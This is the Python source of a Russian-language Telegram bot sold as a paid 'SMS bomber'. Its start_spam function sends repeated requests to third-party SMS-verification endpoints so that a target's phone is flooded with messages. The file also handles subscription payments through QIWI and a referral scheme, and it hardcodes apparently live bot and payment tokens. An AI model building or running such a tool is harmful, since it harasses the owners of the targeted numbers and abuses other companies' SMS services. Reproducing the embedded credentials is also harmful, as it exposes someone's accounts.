import os
import json
import random
import sqlite3
import requests
from multiprocessing import Process, Queue
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils.helper import Helper, HelperMode, ListItem

token = '5946755095:AAHJDpVUU7IsJi0f_nkAMn1buBZorevzwgk'

bot = Bot(token=token)


dp = Dispatcher(bot)

phone = '+79964027985' #телефон qiwi

token = '542e80103661bf5b09c51f32cf' #qiwi токен

publick_key = '48e7qUxn9T7RyYE1MVZswX1FRSbE6iyCj2gCRwwF3Dnh5XrasNTx3BGPiMsyXQFNKQhvukniQG8RTVhYm3iPxEHmr6v64nMtQ44M3rAfq68pHNpqPbSxecnrWjoWmQHmwpikbnU6GWweNUQUM1cyXNx1WZgaAjoa2LJ3V2eVrhZkJAqHpWk9uMgqr897r' #публичный токен

amount = 150 # цена за подписку


admins = [5269625333] #добавь сюда свой ID


profile_button = types.KeyboardButton('Профиль🔮')

pay_button = types.KeyboardButton('Оплата👀')

referal_button = types.KeyboardButton('Реферальная система🎯')

admin_button = types.KeyboardButton('Админ панель🔒')

back_button = types.KeyboardButton('Назад')

start_spam_button = types.KeyboardButton('Начать атаку💡')

help_button = types.KeyboardButton('Помощь⚡️')

main_keyboard = types.ReplyKeyboardMarkup().add(profile_button).add(help_button)

profile_keyboard = types.ReplyKeyboardMarkup().add(pay_button,referal_button,admin_button,back_button,start_spam_button)

def new_payment(telegram_id,comment,payment_sum):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    cursor.execute(f'UPDATE users SET comment = ? WHERE telegram_id = ?;', (comment, telegram_id))
    cursor.execute(f'UPDATE users SET payment_sum = ? WHERE telegram_id = ?;', (payment_sum, telegram_id))
    conn.commit()

def new_user(telegram_id):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    query = f"""SELECT * from users WHERE telegram_id={telegram_id}"""
    cursor.execute(query)
    check = cursor.fetchall()
    if check:
        pass
    else:
        cursor.execute("""INSERT INTO users
                    VALUES (?,?,?,?,?,?,?)""",(telegram_id, "1", 1000, 0, 0, telegram_id, 1)
        )
        conn.commit()
        return 'new user'

def add_sub(telegram_id):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    cursor.execute(f'UPDATE users SET sub = ? WHERE telegram_id = ?;', (1, telegram_id))
    conn.commit()


def check_sub(telegram_id):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    for row in cursor.execute("SELECT telegram_id,sub FROM users"):
        user_id = row[0]
        if user_id == telegram_id:
            sub = row[1]
            return sub

def add_promo(telegram_id, promo):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    for row in cursor.execute("SELECT telegram_id,promo,referal_code FROM users"):
        user_id = row[0]
        if user_id == telegram_id:
            user_promo = row[1]
            referal_code = row[2]
            if int(user_promo) == 1 and int(referal_code) != int(user_promo):
                cursor.execute(f'UPDATE users SET promo = ? WHERE telegram_id = ?;', (promo, telegram_id))
                conn.commit()


def get_referals(telegram_id,promo):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    referals = 0
    for row in cursor.execute("SELECT telegram_id,promo FROM users"):
        ref_promo = row[1]
        if ref_promo == promo:
            referals += 1
    if referals != None:
        return referals
    elif referals == None:
        return 0

def get_balance(telegram_id):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    for row in cursor.execute("SELECT telegram_id,balance FROM users"):
        user_id = row[0]
        if user_id == telegram_id:
            balance = row[1]
            return balance



def checkbalance(telegram_id):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    for row in cursor.execute("SELECT telegram_id,balance FROM users"):
        user_id = row[0]
        if user_id == telegram_id:
            balance = row[1]
            if balance >= 1000:
                balance = int(balance - 1000)
                cursor.execute(f'UPDATE users SET balance = ? WHERE telegram_id = ?;', (balance, telegram_id))
                cursor.execute(f'UPDATE users SET sub = ? WHERE telegram_id = ?;', (1, telegram_id))
                conn.commit()
                return True
            elif balance < 1000:
                return False


def referal_pay(telegram_id):
    """
    Система которая добавляет 10%
    человеку процент от реферальный системы
    """
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    for row in cursor.execute("SELECT telegram_id,promo FROM users"):
        user_id = row[0]
        if user_id == telegram_id:
            promo = row[1]
            if promo != 1:
                ref_balance = amount / 10
                cursor.execute(f'UPDATE users SET balance = ? WHERE telegram_id = ?;', (ref_balance, promo))
                conn.commit()
                return promo
                
def get_comment(telegram_id):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    for row in cursor.execute("SELECT telegram_id,comment FROM users"):
        user_id = row[0]
        if user_id == telegram_id:
            comment = row[1]
            return comment


def edit_balance(telegram_id):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    cursor.execute(f'UPDATE users SET balance = ? WHERE telegram_id = ?;', (0, telegram_id))
    conn.commit()



def start_spam(_phone):
    if _phone[0] == '+':
	    _phone = _phone[1:]
    if _phone[0] == '8':
        _phone = '7'+_phone[1:]
    if _phone[0] == '9':
        _phone = '7'+_phone
    def send_messsages(_phone):
        try:
            process = 7
            while process:
                try:
                    requests.post(

                        "https://cabinet.planetakino.ua/service/sms",
                        params={"phone": _phone},
                    )
                except:
                    pass
                try:
                    requests.post("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": _phone})
                except:
                    pass
                
                process -= 1
        
        except:
            pass
        
   

    send_messsages(_phone)


@dp.message_handler(commands=['start'])
async def start_message(message: types.Message):
    await bot.send_message(message.chat.id, 'Я смс бомбер.Управление с помощью кнопок ниже.', reply_markup=main_keyboard)
    user = new_user(message.chat.id)
    if user == 'new user':
        await bot.send_message(message.chat.id, 'У вас есть реферальный код?Если есть напишите /ref код')
   


@dp.message_handler(text=["Помощь⚡️"])
async def help_message(message: types.Message):
    await bot.send_message(message.chat.id, "Выдать бесплатную подписку /sub телеграм ID\n/spam номер - начать атаку\n/ref код - ввести реферальный код")

@dp.message_handler(text=['Профиль🔮'])
async def profile(message: types.Message):
    check = check_sub(message.chat.id)
    if not check:
        await bot.send_message(message.chat.id, f'Ваш ID:{message.chat.id}👾\nПодписка:не активна😞', reply_markup=profile_keyboard)
    elif check:
        await bot.send_message(message.chat.id, f'Ваш ID:{message.chat.id}👾\nПодписка:активна👑', reply_markup=profile_keyboard)


@dp.message_handler(text=["Назад"])
async def back_message(message: types.Message):
    await bot.send_message(message.chat.id, 'Вернул вас в меню.', reply_markup=main_keyboard)


@dp.message_handler(text=['Запустить спам💡'])
async def spam(message: types.Message):
    referal_button = types.KeyboardButton('Реферальная система🎯')
    admin_button = types.KeyboardButton('Админ панель🔒')
    help_button = types.KeyboardButton('Помощь⚡️')
    back_button = types.KeyboardButton('Назад')
    spam_button = types.KeyboardButton('Остановить спам💡')
    profile_keyboard = types.ReplyKeyboardMarkup().add(referal_button,admin_button,spam_button,help_button,back_button)
    await bot.send_message(message.chat.id, 'Напишите номер,пример 7XXX.', reply_markup=profile_keyboard)


@dp.message_handler(text=['Оплата👀'])
async def payment(message: types.Message):
    check = check_sub(message.chat.id)
    if not check:
        comment = ''.join(random.choices('qwertyuiopsdfghjkl;zxcvbnm',k=10)) + str(random.randint(1, 1000))
        s = requests.Session()
        s.headers['authorization'] = 'Bearer' + token
        parameters = {'publicKey':publick_key,'amount':amount,'phone':phone,'comment':comment}
        h = s.get('https://oplata.qiwi.com/create', params = parameters)
        inlinepay_keyboard = types.InlineKeyboardMarkup()
        pay_sub = types.InlineKeyboardButton('Оплатить подписку(qiwi)', url=h.url)
        check_pay = types.InlineKeyboardButton(text='Проверить оплату QIWI😎',callback_data='checkpay')
        pay_sub_balance = types.InlineKeyboardButton(text='Оплатить с баланса в боте',callback_data='checkbalance')
        inlinepay_keyboard = inlinepay_keyboard.add(pay_sub).add(pay_sub_balance).add(check_pay)
        await bot.send_message(message.chat.id, f'Для оплаты нажмите на кнопку ниже.', reply_markup=inlinepay_keyboard)
        new_payment(message.chat.id,comment,amount)
    elif check:
        await bot.send_message(message.chat.id, 'Вы уже купили подписку,удачного пользования!', reply_markup=main_keyboard)
    


@dp.callback_query_handler(text='checkpay')
async def check_payment(query: types.CallbackQuery):
    comment = get_comment(query.message.chat.id)
    s = requests.Session()
    s.headers['authorization'] = 'Bearer ' +  token
    parameters = {'rows': '50', 'operation':'IN'}
    h = s.get('https://edge.qiwi.com/payment-history/v1/persons/'+ phone +'/payments', params = parameters)
    result = json.loads(h.text)
    for i in range(len(result['data'])):
        if result['data'][i]['comment'] == str(comment):
            if result['data'][i]['sum']['amount'] >= amount:
                await bot.send_message(query.message.chat.id, 'Оплата прошла,добавил вас в базу')
                inviter = referal_pay(query.message.chat.id)
                await bot.send_message(inviter, 'Ваш реферал оплатил подписку вам начислено 10%🤑')
                add_sub(query.message.chat.id)
                break
        else:
            await bot.send_message(query.message.chat.id, 'Не нашел вашу оплату')
            break

@dp.callback_query_handler(text='checkbalance')
async def check_balance(query: types.CallbackQuery):
    pay = checkbalance(query.message.chat.id)
    if pay:
        await bot.send_message(query.message.chat.id, 'Вы успешно купили подписку💎')
    elif not pay:
        await bot.send_message(query.message.chat.id, 'На вашем балансе не достаточно денег!')



@dp.message_handler(text=['Начать атаку💡'])
async def spam_start_func(message: types.Message):
    referal_button = types.KeyboardButton('Реферальная система🎯')
    admin_button = types.KeyboardButton('Админ панель🔒')
    help_button = types.KeyboardButton('Помощь⚡️')
    back_button = types.KeyboardButton('Назад')
    spam_button = types.KeyboardButton('Закончить атаку💡')
    profile_keyboard = types.ReplyKeyboardMarkup().add(referal_button,admin_button,spam_button,help_button,back_button)
    await bot.send_message(message.chat.id, 'Напишите номер,пример 7XXX.', reply_markup=profile_keyboard)



@dp.message_handler(text=['Закончить атаку💡'])
async def stop_spam_func(message:types.Message):
    await bot.send_message(message.chat.id, 'Успешно приостановлен', reply_markup=profile_keyboard)



@dp.message_handler(text=['Админ панель🔒'])
async def admin(message: types.Message):
    chat_id = message.chat.id
    if chat_id in admins:
        await bot.send_message(message.chat.id, 'Вы вошли в админ панель.\n/sub @ТЕЛЕГРАММ ID - выдать бесплатную подписку\n/changebalance @ТЕЛЕГРАММ ID - сбросить реферальный баланс до нуля')
    else:
        await bot.send_message(message.chat.id, 'У вас нет доступа к админ панели!')


@dp.message_handler(text=['Реферальная система🎯'])
async def referal_system(message: types.Message):
    balance = get_balance(message.chat.id)
    await bot.send_message(message.chat.id, f'Получите 10% от пополнения ваших рефералов💳\nБаланс от рефералов:{balance}₽\nВаш реферальный код:{message.chat.id}⚙️\nКоличество ваших рефералов:{get_referals(message.chat.id,message.chat.id)}⭐️')



@dp.message_handler(content_types=['text'])
async def admin_commands(message: types.Message):
    if '/sub' in message.text:
        chat_id = message.chat.id
        telegram_id = message.text.replace('/sub', '').replace(' ', '')
        if chat_id in admins:
            new_user(telegram_id)
            add_sub(telegram_id)
            await bot.send_message(message.chat.id, 'Выдал бесплатный доступ👥')
            try:
                await bot.send_message(telegram_id, 'Вам выдали бесплатный доступ к боту🤩')
            except:
                pass
        else:
            await bot.send_message(message.chat.id, 'У вас нет доступа к данной функции!')
    elif '/ref' in message.text:
        promo = message.text.replace('/ref', ' ').replace(' ', '')
        add_promo(message.chat.id, promo)
        await bot.send_message(message.chat.id, 'Промокод активирован!')
    elif '/spam' in message.text:
        check = check_sub(message.chat.id)
        number = message.get_args()
        if check and number != '' and len(number) == 11:
            await bot.send_message(message.chat.id, f'Спам на номер {number} запущен!')
            spam_thread = Process(target=start_spam, args=(number,))
            spam_thread.start()
        elif check and len(number) != 11:
            await bot.send_message(message.chat.id, f'Ожидается 11 цифр,вы ввели {len(number)}')

    elif message.text == '/admin':
        chat_id = message.chat.id
        if chat_id in admins:
            await bot.send_message(message.chat.id, 'Вы вошли в админ панель.\n/sub @ТЕЛЕГРАММ ID - выдать бесплатную подписку')
        else:
            await bot.send_message(message.chat.id, 'У вас нет доступа к админ панели!')
    elif message.text == '/stop':
        await bot.send_message(message.cha.id, 'Бомбер будет выключен в течение 5 мин.')
    elif '79' in message.text and len(message.text) == 11:
        check = check_sub(message.chat.id)
        if not check or check == None:
            await bot.send_message(message.chat.id, 'У вас нет подписки!Для покупки напишете Оплата👀')
        elif check:
            number = message.text
            await bot.send_message(message.chat.id, f'Спам на номер {number} запущен!')
            spam_thread = Process(target=start_spam, args=(number,))
            spam_thread.start()
    elif '/changebalance' in message.text:
        telegram_id = message.text.replace('/changebalance', ' ').replace(' ', '')
        edit_balance(telegram_id)
    elif '/stop' in message.text:
        await bot.send_message(message.chat.id, 'Успешно приостановлен.')



if __name__ == '__main__':
    executor.start_polling(dp)
